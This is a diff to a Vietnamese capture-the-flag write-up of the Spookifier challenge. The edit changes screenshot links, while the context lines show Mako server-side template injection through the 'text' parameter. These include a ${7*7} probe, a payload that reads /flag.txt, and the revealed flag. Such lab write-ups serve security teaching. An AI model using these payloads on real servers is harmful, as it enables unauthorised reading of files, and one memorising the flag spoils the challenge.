@@ -35,7 +35,9 @@ Trang chủ nhận input qua query parameter `text`:
 http://154.57.164.73:31608/?text=abc
 ```
 
-![Trang Spookifier với input abc](/images/spookifier/spookifier-01.png)
+![Trang Spookifier với input abc](https://tameruict.github.io/images/spookifier/spookifier-01.png)
+
+![Trang Spookifier sau khi gửi input testtt](https://tameruict.github.io/images/spookifier/spookifier-06.png)
 
 Giá trị được hiển thị lại dưới nhiều font khác nhau. Việc user input đi thẳng qua URL và được render nhiều lần là dấu hiệu đáng chú ý để kiểm tra SSTI.
 
@@ -43,7 +45,7 @@ Giá trị được hiển thị lại dưới nhiều font khác nhau. Việc u
 
 Source cho thấy ứng dụng sử dụng Mako:
 
-![Source code import Mako và tạo template](/images/spookifier/spookifier-02.png)
+![Source code import Mako và tạo template](https://tameruict.github.io/images/spookifier/spookifier-02.png)
 
 ```python
 from mako.template import Template
@@ -51,7 +53,7 @@ from mako.template import Template
 
 Trong `routes.py`, dữ liệu lấy từ request được chuyển vào hàm `spookify` rồi truyền tới template:
 
-![Route đọc tham số text và gọi spookify](/images/spookifier/spookifier-03.png)
+![Route đọc tham số text và gọi spookify](https://tameruict.github.io/images/spookifier/spookifier-03.png)
 
 ```python
 text = request.args.get('text')
@@ -80,7 +82,7 @@ http://154.57.164.73:31608/?text=${7*7}
 
 Kết quả hiển thị `49`. Điều này chứng minh `${...}` được Mako xử lý, thay vì chỉ được hiển thị như chuỗi văn bản.
 
-![Kết quả 49 khi kiểm tra biểu thức SSTI](/images/spookifier/spookifier-04.png)
+![Kết quả 49 khi kiểm tra biểu thức SSTI](https://tameruict.github.io/images/spookifier/spookifier-04.png)
 
 ### 2. Đọc flag
 
@@ -98,7 +100,7 @@ http://154.57.164.73:31608/?text=${open(%27/flag.txt%27).read()}
 
 Kết quả trả về là:
 
-![Flag trả về qua payload đọc file](/images/spookifier/spookifier-05.png)
+![Flag trả về qua payload đọc file](https://tameruict.github.io/images/spookifier/spookifier-05.png)
 
 ```text
 HTB{t3mp1at3_1nj3ct10n_c4n_3x1s+5_4nywh3r3!}
